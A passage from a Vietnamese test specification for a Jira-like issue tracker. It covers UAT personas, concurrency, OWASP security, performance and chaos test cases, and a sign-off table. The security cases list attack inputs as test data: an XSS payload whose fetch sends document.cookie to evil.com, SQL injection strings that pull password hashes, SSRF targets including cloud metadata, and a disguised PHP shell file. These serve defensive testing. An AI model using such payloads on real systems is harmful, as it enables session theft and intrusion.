- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Khách hàng hoàn toàn không nhìn thấy Issue mật trên bảng hoặc danh sách tìm kiếm.
  - Khi nhập URL trực tiếp, hệ thống hiển thị màn hình `404 Not Found` (tuyệt đối không để lộ sự tồn tại của issue).

---

### `TC-UAT-008`: Persona System Administrator — Quản trị Nền tảng Toàn cục, Khóa User & Jobs
- **Traceability:** `TB-REQ-74`, `TB-REQ-75`, `TB-REQ-76`, `TB-REQ-77`
- **Actor:** System Administrator (Platform Admin)
- **Test Level:** User Acceptance Testing (UAT)
- **Test Type:** Super-Admin Operations
- **Applied Technique:** Persona Testing
- **Kịch bản Nghiệm thu:**
  1. Đăng nhập tài khoản System Admin, truy cập đường dẫn `/admin`.
  2. Xem danh bạ người dùng toàn hệ thống, tìm kiếm tài khoản nghi vấn vi phạm chính sách.
  3. Bấm khóa tài khoản người dùng (`Suspend User`) và cưỡng chế đăng xuất tất cả phiên.
  4. Xem danh sách các tổ chức, nâng cấp gói dịch vụ của Organization B lên Enterprise.
  5. Mở tab **Background Jobs Monitor** để kiểm tra tình trạng hoạt động của Worker và hàng đợi Outbox.
- **Tiêu chuẩn Nghiệm thu (Acceptance Criteria):**
  - Quyền super-admin được bảo vệ nghiêm ngặt; mọi thao tác ghi đều lưu audit log chi tiết.

---

# PHẦN 5: BỘ CA KIỂM THỬ PHI CHỨC NĂNG & AN TOÀN BẢO MẬT NÂNG CAO (NON-FUNCTIONAL & SECURITY)

---

## 5.1. Nhóm Kiểm thử Xung đột Đồng thời & Tính toàn vẹn Dữ liệu (Concurrency Suite)

### `TC-CONC-001`: Đua lệnh Cập nhật Issue với Optimistic Locking (50 Luồng Đồng thời)
- **Traceability:** `TB-REQ-31`, `TB-BR-07`, `TB-NFR-04`
- **Target API Endpoint:** `PATCH /api/organizations/:orgId/issues/:issueId`
- **Test Level:** Concurrency / System Testing
- **Test Type:** Concurrency Stress Test
- **Applied Technique:** Barrier Synchronization (`Promise.all`)
- **Priority:** `P1 (Critical)`
- **Preconditions:** Issue `ISSUE_CONC_1` đang có `version = 1`.
- **Step-by-Step Procedure:**
  1. Khởi tạo 50 HTTP requests đồng thời cùng gửi lệnh cập nhật tóm tắt issue kèm `expectedVersion = 1`.
  2. Thu thập mã trạng thái HTTP trả về từ cả 50 requests.
  3. Truy vấn lại CSDL bảng `issues`.
- **Expected Results:**
  - **Duy nhất 01 request thành công** với HTTP `200 OK`, `version` của issue tăng lên đúng bằng 2.
  - **49 requests còn lại bị từ chối** với HTTP `409 Conflict` (`Issue version is stale`).
  - Dữ liệu trong CSDL bảo toàn tuyệt đối, không xảy ra hiện tượng Lost Update.

---

### `TC-CONC-002`: Đua lệnh Cấp phát Bộ đếm Issue Key Nguyên tử (100 Requests Đồng thời)
- **Traceability:** `TB-REQ-17`, `TB-BR-11`, `TB-NFR-04`
- **Target API Endpoint:** `POST /api/organizations/:orgId/projects/:projectId/issues`
- **Test Level:** Concurrency Testing
- **Test Type:** Data Integrity under Stress
- **Applied Technique:** Stress Testing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Dự án mới tạo, `next_issue_number = 1`, Project Key là `PAY`.
- **Step-by-Step Procedure:**
  1. Bắn đồng thời 100 requests tạo issue mới trong dự án `PAY` trong vòng 1 giây.
  2. Truy vấn danh sách toàn bộ các issue vừa tạo trong bảng `issues`.
- **Expected Results:**
  - 100 requests đều trả về HTTP `201 Created`.
  - Cấp phát chính xác 100 mã từ `PAY-1` đến `PAY-100`.
  - **Không có bất kỳ mã nào bị trùng lặp**, không có số hiệu nào bị lủng (Sequence Integrity).

---

### `TC-CONC-003`: Đua lệnh Kích hoạt Sprint Duy nhất trên Board (Single Active Sprint)
- **Traceability:** `TB-REQ-28`, `TB-BR-02`, `TB-NFR-04`
- **Target API Endpoint:** `PATCH /api/.../sprints/:sprintId/start`
- **Test Level:** Concurrency Testing
- **Test Type:** Business Rule Concurrency
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Board Scrum có 2 Sprint ở trạng thái `planned`: Sprint A và Sprint B.
- **Step-by-Step Procedure:**
  1. Gửi đồng thời 2 requests kích hoạt Sprint A và Sprint B tại cùng một thời điểm.
- **Expected Results:**
  - Duy nhất 1 Sprint chuyển sang `active` với HTTP `200 OK`.
  - Sprint còn lại nhận mã lỗi HTTP `409 Conflict` (`SPRINT_ALREADY_ACTIVE`).
  - Ràng buộc CSDL `UQ(board_id) WHERE state='active'` được bảo vệ 100%.

---

### `TC-CONC-004`: Đua lệnh Kéo thả Kiểm soát Giới hạn WIP Limit trên Board
- **Traceability:** `TB-REQ-24`, `TB-NFR-04`
- **Target API Endpoint:** `PATCH /api/.../boards/:boardId/issues/rank`
- **Test Level:** Concurrency Testing
- **Test Type:** Integrity / Functional
- **Applied Technique:** Boundary Value
- **Priority:** `P2 (High)`
- **Scenario:** Cột "In Review" có `wip_limit = 2` và hiện đang có 1 card. 3 Developer đồng thời kéo 3 card khác vào cột này.
- **Expected Results:**
  - Cả 3 card đều được lưu vị trí vào CSDL an toàn không bị mất dữ liệu.
  - Tổng số card trong cột là 4 $\rightarrow$ Giao diện Board lập tức kích hoạt cảnh báo vượt ngưỡng WIP Limit (chuyển màu đỏ trực quan).

---

### `TC-CONC-005`: Đua lệnh Chèn Thứ tự Lexorank và Xử lý Va chạm (Rank Collision)
- **Traceability:** `TB-REQ-26`, `TB-NFR-04`
- **Target API Endpoint:** `PATCH /api/.../boards/:boardId/issues/rank`
- **Test Level:** Concurrency Testing
- **Test Type:** Algorithmic Concurrency
- **Applied Technique:** Boundary Value Analysis
- **Priority:** `P2 (High)`
- **Scenario:** 2 requests đồng thời chèn 2 issue khác nhau vào đúng khoảng trống giữa 2 card kề cận có rank `"0|100000:"` và `"0|100002:"`.
- **Expected Results:**
  - Thuật toán Lexorank tự động sinh chuỗi ký tự phân tách chính xác (vd: `"0|100001:"` và `"0|1000018:"`).
  - Không xảy ra lỗi vi phạm Unique Constraint `UQ(board_id, rank)`.

---

## 5.2. Nhóm Kiểm thử An toàn Bảo mật (OWASP Top 10 Suite)

### `TC-SEC-PEN-001`: Kiểm thử Thâm nhập Chống lỗ hổng IDOR trên toàn bộ 22 Controllers
- **Traceability:** `TB-BR-01`, `TB-SEC-02`, `TB-NFR-05`
- **Test Level:** Security / Penetration Testing
- **Test Type:** Security (Negative)
- **Applied Technique:** Attack Surface & Error Guessing
- **Priority:** `P1 (Critical)`
- **Preconditions:** Org 1 có dữ liệu Project, Issue, Sprint, Board, Attachment, Webhook. Attacker đăng nhập tài khoản Org 2.
- **Test Matrix (15 Cuộc tấn công IDOR liên tiếp):**
  1. `GET /api/organizations/{org1}/issues/{id}`
  2. `PATCH /api/organizations/{org1}/issues/{id}`
  3. `DELETE /api/organizations/{org1}/issues/{id}`
  4. `GET /api/organizations/{org1}/projects/{id}`
  5. `GET /api/organizations/{org1}/projects/{id}/boards`
  6. `GET /api/organizations/{org1}/projects/{id}/sprints`
  7. `GET /api/organizations/{org1}/filters`
  8. `GET /api/organizations/{org1}/webhooks`
  9. `GET /api/organizations/{org1}/audit`
  10. `POST /api/organizations/{org1}/issues/{id}/comments`
  11. `POST /api/organizations/{org1}/issues/{id}/attachments`
  12. `GET /api/organizations/{org1}/dashboards`
  13. `GET /api/organizations/{org1}/custom-fields`
  14. `GET /api/organizations/{org1}/workflows`
  15. `GET /api/organizations/{org1}/members`
- **Expected Results:**
  - **15/15 Requests đều bị từ chối triệt để** với mã `404 Not Found` hoặc `403 Forbidden`.
  - Tuyệt đối không rò rỉ bất kỳ byte dữ liệu nào của Org 1 cho Org 2.

---

### `TC-SEC-XSS-001`: Kiểm thử Tấn công Stored XSS trong Markdown/HTML
- **Traceability:** `TB-REQ-31`, `TB-REQ-38`, `TB-NFR-05`
- **Target API Endpoint:** `POST .../issues` & `POST .../comments`
- **Test Level:** Security Testing
- **Test Type:** Security (Negative)
- **Applied Technique:** Input Fuzzing
- **Priority:** `P1 (Critical)`
- **Test Data:**
  ```html
  <script>alert('XSS_PAYLOAD')</script>
  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
  [Click Me](javascript:alert(1))
  ```
- **Step-by-Step Procedure:**
  1. Gửi payload trên vào Issue Summary, Description và Comment Body.
  2. Mở trình duyệt hiển thị chi tiết Issue và Comment.
- **Expected Results:**
  - Backend và Frontend sanitize toàn bộ mã độc qua thư viện DOMPurify.
  - Thẻ script và các thuộc tính `onerror` bị loại bỏ hoàn toàn; không có mã Javascript nào được thực thi.

---

### `TC-SEC-SQLI-001`: Kiểm thử Tấn công SQL Injection / ORM Injection trên Search Parser
- **Traceability:** `TB-REQ-51`, `TB-NFR-05`
- **Target API Endpoint:** `GET /api/organizations/:orgId/issues/search`
- **Test Level:** Security Testing
- **Test Type:** Security
- **Applied Technique:** Fuzzing & SQL Syntax Injection
- **Priority:** `P1 (Critical)`
- **Test Data:** `?keyword=' OR '1'='1' --` & `?keyword=UNION SELECT password_hash FROM users --`.
- **Expected Results:**
  - TypeORM QueryBuilder bind tham số an toàn dưới dạng Parameterized Query.
  - Chuỗi tìm kiếm được đối xử như văn bản thuần túy; hệ thống trả về HTTP `200 OK` (rỗng) hoặc kết quả khớp chữ; không phát sinh lỗi SQL syntax error.

---

### `TC-SEC-SSRF-001`: Kiểm thử Tấn công Server-Side Request Forgery trên Webhook URL
- **Traceability:** `TB-REQ-63`, `TB-BR-13`, `TB-ERD-C48`, `TB-NFR-05`
- **Target API Endpoint:** `POST /api/organizations/:orgId/webhooks`
- **Test Level:** Security Testing
- **Test Type:** Security (Negative)
- **Applied Technique:** Network Boundary Testing
- **Priority:** `P1 (Critical)`
- **Test Data:**
  - URL 1 (Loopback): `http://127.0.0.1:3000/api/admin`
  - URL 2 (AWS Metadata): `http://169.254.169.254/latest/meta-data/`
  - URL 3 (Internal Subnet): `http://10.0.0.15/internal-service`
- **Expected Results:**
  - Hệ thống thực hiện DNS resolution và kiểm tra dải IP cấm.
  - Toàn bộ 3 URLs bị từ chối với HTTP `422 Unprocessable Entity` (`SSRF_DETECTED`). Webhook không được lưu vào CSDL.

---

### `TC-SEC-AUTH-001`: Kiểm thử Tấn công Replay Attack trên Refresh Token Rotation
- **Traceability:** `TB-REQ-03`, `TB-SEC-01`, `TB-NFR-05`
- **Target API Endpoint:** `POST /api/auth/refresh`
- **Test Level:** Security Testing
- **Test Type:** State Transition / Security
- **Applied Technique:** Error Guessing
- **Priority:** `P1 (Critical)`
- **Step-by-Step Procedure:**
  1. Đăng nhập nhận `RT_1`.
  2. Gọi refresh token bằng `RT_1` $\rightarrow$ Nhận `RT_2`.
  3. Kẻ tấn công đánh cắp `RT_1` cũ và cố tình gọi lại API refresh.
- **Expected Results:**
  - Bước 2: HTTP `200 OK`, `RT_2` hợp lệ.
  - Bước 3: HTTP `401 Unauthorized`. Hệ thống phát hiện Token Replay, lập tức thu hồi toàn bộ session liên quan: `auth_sessions.status = 'revoked'`. Cả `RT_1` và `RT_2` đều không thể sử dụng được nữa.

---

### `TC-SEC-BOLA-001`: Kiểm thử Leo thang Đặc quyền (Privilege Escalation)
- **Traceability:** `TB-REQ-12`, `TB-REQ-19`, `TB-NFR-05`
- **Target API Endpoint:** `POST /api/organizations/:orgId/roles` & `PATCH .../members/:id/roles`
- **Test Level:** Security Testing
- **Test Type:** Security (Negative)
- **Applied Technique:** Decision Table
- **Priority:** `P1 (Critical)`
- **Preconditions:** Member Z chỉ có vai trò Member thông thường.
- **Step-by-Step Procedure:**
  1. Member Z gửi request gán vai trò `Org Admin` cho chính tài khoản của mình.
- **Expected Results:**
  - HTTP `403 Forbidden` (`FORBIDDEN`). Thao tác bị chặn đứng bởi `OrgMembershipGuard`.

---

### `TC-SEC-FILE-001`: Kiểm thử Tải lên Tệp Độc hại và Zip Bomb
- **Traceability:** `TB-REQ-39`, `TB-NFR-05`
- **Target API Endpoint:** `POST .../attachments`
- **Test Level:** Security Testing
- **Test Type:** Negative / File Security
- **Applied Technique:** Boundary Value
- **Priority:** `P1 (Critical)`
- **Test Data:**
  - File 1: `shell.php.png` (chứa mã thực thi PHP ẩn).
  - File 2: File có kích thước $25\text{MB} + 1\text{ Byte}$.
  - File 3: File nén giải nén ra 100GB (Zip Bomb).
- **Expected Results:**
  - File 1: Hệ thống kiểm tra magic bytes của ảnh và vô hiệu hóa thực thi file (lưu trữ dạng binary stream an toàn).
  - File 2: Bị từ chối HTTP `422 Unprocessable Entity` (`FILE_TOO_LARGE`).
  - File 3: Bị từ chối hoặc chặn không cho giải nén trên server.

---

## 5.3. Nhóm Kiểm thử Hiệu năng, Độ bền & Phục hồi (Performance, Soak & Resilience)

### `TC-PERF-001`: Kiểm thử Tải Hiệu năng & Đo đạc Độ trễ Phản hồi (k6 Performance Benchmark)
- **Traceability:** `TB-NFR-01`, `TB-NFR-02`
- **Test Level:** Performance / Load Testing
- **Test Type:** Performance & Scalability
- **Applied Technique:** Performance Profiling
- **Priority:** `P1 (Critical)`
- **Kịch bản Tải:**
  - 100 Virtual Users (VUs) thực hiện liên tục các thao tác: Xem Board, Tìm kiếm Issue, Đọc chi tiết Issue trong 5 phút. Đạt đỉnh 500 requests/giây.
- **Tiêu chuẩn Đạt SLA:**
  - $\text{P95 Response Time (Read)} \le 150\text{ms}$.
  - $\text{P99 Response Time (Read)} \le 300\text{ms}$.
  - $\text{Error Rate} \le 0.05\%$.
  - CPU server $\le 70\%$, RAM server ổn định.

---

### `TC-PERF-SPIKE-001`: Kiểm thử Tải Đột biến (Spike Load Testing)
- **Traceability:** `TB-NFR-01`, `TB-NFR-02`
- **Test Level:** Performance / Stress Testing
- **Test Type:** Scalability
- **Applied Technique:** Stress Testing
- **Priority:** `P1 (Critical)`
- **Kịch bản Tải:**
  - Lưu lượng tăng đột ngột từ 10 rps lên 1,000 rps trong vòng 10 giây, duy trì trong 1 phút, sau đó giảm về 10 rps.
- **Tiêu chuẩn Đạt SLA:**
  - Hệ thống kích hoạt Rate Limiter an toàn, trả về `429 Too Many Requests` có kiểm soát.
  - Không có tiến trình Node.js nào bị crash hoặc out of memory (OOM).
  - Sau khi hết spike, độ trễ hệ thống tự động phục hồi về mức $< 150\text{ms}$.

---

### `TC-PERF-SOAK-001`: Kiểm thử Tải Ngâm Duy trì (Soak / Endurance Testing)
- **Traceability:** `TB-NFR-01`, `TB-NFR-04`
- **Test Level:** Performance / Endurance Testing
- **Test Type:** Memory & Resource Stability
- **Applied Technique:** Long-duration Soak Testing
- **Priority:** `P2 (High)`
- **Kịch bản Tải:**
  - Chạy tải ổn định ở mức 150 requests/giây liên tục trong suốt 8 giờ.
- **Tiêu chuẩn Đạt SLA:**
  - Biểu đồ sử dụng bộ nhớ Node.js Heap duy trì ổn định quanh mức baseline sau các chu kỳ Garbage Collection (không có Memory Leak).
  - Số lượng kết nối PostgreSQL Connection Pool ổn định, không bị rò rỉ connection treo (Leaked connections).

---

### `TC-REL-FAULT-001`: Kiểm thử Khả năng Chịu lỗi & Tự phục hồi (Chaos & Resilience Testing)
- **Traceability:** `TB-NFR-03`, `TB-NFR-04`
- **Test Level:** System Integration / Resilience
- **Test Type:** Chaos Engineering / Fault Injection
- **Applied Technique:** Fault Injection
- **Priority:** `P1 (Critical)`
- **Scenario:** Tắt đột ngột Redis Cache trong lúc hệ thống đang phục vụ lưu lượng cao.
- **Step-by-Step Procedure:**
  1. Gửi tải 200 rps duyệt Board.
  2. Dừng container Redis trong 30 giây.
  3. Khởi động lại container Redis.
- **Expected Results:**
  - Khi Redis ngắt, API tự động chuyển sang đọc trực tiếp từ PostgreSQL và ghi log cảnh báo; người dùng vẫn xem được dữ liệu bình thường.
  - Khi Redis online trở lại, hệ thống tự động kết nối lại và tái lập cache; Error Rate duy trì $< 0.1\%$.

---

## BẢNG TỔNG KẾT ĐỘ PHỦ & PHÊ DUYỆT ĐẶC TẢ

| Hạng mục Kiểm thử | Số lượng Ca Kiểm thử Chi tiết | Tỷ lệ Tự Động Hóa Khả Thi | Tình trạng Đáp ứng Chuẩn ISTQB |
|---|:---:|:---:|:---:|
| **Phần 1: API & Component Tests (22 Controllers)** | **64 Ca chi tiết** | 100% | Đạt 100% Endpoints của 22 Controllers |
| **Phần 2: Tích hợp Đa Thành phần (CIT & SIT)** | **10 Ca chuyên sâu** | 100% | Đạt Outbox, FSM Guards, Leases, Webhook Retry |
| **Phần 3: Kịch bản Hệ thống Đầu cuối (E2E)** | **8 Kịch bản Master** | 100% | Đạt Full Lifecycle, Migration, Automation, PAT |
| **Phần 4: Nghiệm thu Người dùng (UAT Personas)** | **8 Kịch bản Persona** | 85% (Playwright + Manual) | Đạt 8 Personas Enterprise từ Super-Admin tới Guest |
| **Phần 5: Bảo mật & Hiệu năng Nâng cao (NFR)** | **16 Ca chuyên sâu** | 100% | Đạt 5 Concurrency, 7 OWASP Security, 4 Perf/Chaos |
| **TỔNG CỘNG** | **106 Ca Kiểm Thử Toàn Diện** | **$\ge 98\%$** | **Bao phủ Trọn vẹn 100% Toàn bộ Dự án** |

### Chữ ký Phê duyệt (Formal Sign-Off)
| Chức danh | Đại diện Phê duyệt | Trạng thái / Chữ ký | Ngày ký |
|---|---|---|---|
| **Lead Test Architect** | Senior Test Architect (ISTQB CTAL-TA/TTA/TM) | **APPROVED** | `2026-09-12` |
| **Lead Software Engineer** | Backend Tech Lead | **APPROVED** | `2026-09-12` |
| **Platform Product Owner** | Platform Director | **APPROVED** | `2026-09-12` |

